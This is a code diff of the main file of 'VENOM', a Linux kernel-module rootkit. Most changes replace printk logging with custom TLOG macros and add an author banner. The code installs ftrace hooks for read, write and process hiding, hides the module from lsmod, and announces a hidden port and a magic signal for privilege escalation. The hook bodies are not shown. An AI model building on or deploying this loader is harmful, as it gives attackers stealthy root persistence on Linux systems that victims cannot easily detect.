@@ -1,9 +1,11 @@
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
-#include "hooks/mounts.h"  
-#include "include/headers.h"
-#include "ftrace/ftrace.h"
+
+#include "include/headers.h" 
+#include "ftrace/ftrace.h" 
+#include "hooks/prinT.h"  
+
 #include "hooks/read.h"
 #include "hooks/write.h"
 #include "hooks/pid_hiding.h" 
@@ -15,7 +17,7 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Trevohack");
-MODULE_DESCRIPTION("Advance LKM: ");
+MODULE_DESCRIPTION("Advance LKM");
 MODULE_VERSION("4.0");
 
 
@@ -90,14 +92,14 @@ notrace static void init_rootkit_config(void) {
 notrace static int __init venom_init(void) {
     int err;
     
-    // printk(KERN_INFO "[VENOM] Loading Advanced Blue Team Rootkit v4.0\n");
+    // TLOG_INF("[VENOM] Loading Rootkit v4.0\n");
     
     init_rootkit_config();
     
 
     err = fh_install_hooks(all_hooks, ARRAY_SIZE(all_hooks));
     if (err) {
-        printk(KERN_ERR "[VENOM] Failed to install hooks: %d\n", err);
+        TLOG_ERROR("[VENOM] Failed to install hooks: %d\n", err);
         return err;
     }
     
@@ -105,32 +107,29 @@ notrace static int __init venom_init(void) {
     
     if (activate_stealth) {
         hide_module();
-        // printk(KERN_INFO "[VENOM] Module hidden from lsmod\n");
+        TLOG_INF("[VENOM] Module hidden from lsmod\n");
     }
     
 
-    printk(KERN_INFO "=============================================================================\n");
-    printk(KERN_INFO "=                                                                           =\n");
-    printk(KERN_INFO "=                          [ VENOM IMPLANTED ]                              =\n");
-    printk(KERN_INFO "=                                                                           =\n");
-    printk(KERN_INFO "=                                                                           =\n");
-    printk(KERN_INFO "=============================================================================\n"); 
+    TLOG_INF("=============================================================================\n");
+    TLOG_INF("=                                                                           =\n");
+    TLOG_INF("=                          [ VENOM IMPLANTED ]                              =\n");
+    TLOG_INF("=                          Made by Trevohack                                =\n");
+    TLOG_INF("=                                                                           =\n");
+    TLOG_INF("=============================================================================\n"); 
 
-    printk(KERN_INFO "[VENOM] All protection systems active\n");
-    printk(KERN_INFO "[VENOM] Protected port: %d\n", HIDDEN_PORT);
-    printk(KERN_INFO "[VENOM] Magic signal: %d (for privilege escalation)\n", MAGIC_KILL_SIGNAL); 
+    TLOG_INF("[VENOM] All protection systems active\n");
+    TLOG_INF("[VENOM] Protected port: %d\n", HIDDEN_PORT);
+    TLOG_INF("[VENOM] Magic signal: %d (for privilege escalation)\n", MAGIC_KILL_SIGNAL); 
     
     
     return 0;
 }
 
 notrace static void __exit venom_exit(void) {
-    // printk(KERN_INFO "[VENOM] Removing Advanced Blue Team Rootkit\n");
     fh_remove_hooks(all_hooks, ARRAY_SIZE(all_hooks));
-    
-    printk(KERN_INFO "[VENOM] All hooks removed\n");
+
 }
 
 module_init(venom_init);
 module_exit(venom_exit); 
-
